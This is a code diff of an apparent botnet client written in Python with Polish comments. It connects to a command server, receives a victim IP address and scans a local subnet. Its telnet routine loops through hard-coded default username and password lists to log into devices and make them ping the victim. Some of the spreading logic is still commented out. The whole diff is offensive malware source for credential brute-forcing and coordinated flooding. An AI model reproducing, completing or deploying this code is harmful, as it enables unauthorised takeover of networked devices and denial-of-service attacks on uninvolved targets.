@@ -5,16 +5,22 @@ import xtelnet
 from requests import get
 
 
-def telnetConnect(ip_address):
+def telnetConnect(ip_address, victimIP):
     t = xtelnet.session()
     # można zrobić pętlę do wczytywania user credentials z pliku
-    t.connect(ip_address, username='root', password='toor', p=23, timeout=5)
-    output1 = t.execute('echo success')
-    print(output1)
+    users = ['admin', 'root', 'user', '1234', 'administrator']
+    passwords = ['1234', 'toor', '4321', 'admin', 'root', 'user']
+
+    for user in users:
+        for password in passwords:
+            t.connect(ip_address, username=user, password=password, p=23, timeout=5)
+            output1 = t.execute('ping ' + victimIP)
+            print(output1)
+
     t.close()
 
 
-def checkForOtherDevices(ip):
+def checkForOtherDevices(ip, victimIP):
     x = 0
     l = len(ip)
     g = ip.split('.')[-1]
@@ -22,10 +28,10 @@ def checkForOtherDevices(ip):
 
     while x < 254:
         current_address = ip + str(x)
-        # telnetConnect(current_address)  -> wywołać w wątku
+        # telnetConnect(current_address,victimIP) --> w wątku chyba???
         x += 1
         # print(current_address)
-        # próbuj połączyć z każdym przez telnet używając pliku z loginem i hasłem
+        # próbuj połączyć z każdym przez telnet (używając np pliku z loginem i hasłem)
 
 
 if __name__ == '__main__':
@@ -44,32 +50,34 @@ if __name__ == '__main__':
                     s.connect((HOST, PORT))
                     # send info to host that a bot is connected
                     s.send('1'.encode())
-                    #checkForOtherDevices(HOST)
+                    # checkForOtherDevices(HOST)
                     flag = 1
                 except:
                     print('nie udało sie połączyć')
+                    s.close()
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     flag = 0
                     continue
 
-            # while True: czekaj na dane
-            # s.sendall(b'Beginn attack')
             try:
                 data = str(s.recv(1024).decode())
                 print('Received', str(data))
-                if str(data) == '11':
+                if str(data) == '1':
 
                     victim_ip = s.recv(1024).decode()
                     print('victim address:' + str(victim_ip))
+                    checkForOtherDevices(HOST, victim_ip)
 
-                    # s.sendall('ok'.encode())
                 elif data == 2:
+
                     HOST = s.recv(1024)
                     s.close()
+
                 else:
-                    print('cos jest zle')
+                    print('something went wrong')
             except:
                 flag = 0
-                #s.close()
+                # s.close()
                 continue
             # wyślij swój adres ip przy:
             # - każdym połączeniu
@@ -79,4 +87,4 @@ if __name__ == '__main__':
             # print('public IP address: {}'.format(ip))
             # print('operating port: {}'.format(PORT))
 
-            #print('Received', str(data))
+            # print('Received', str(data))
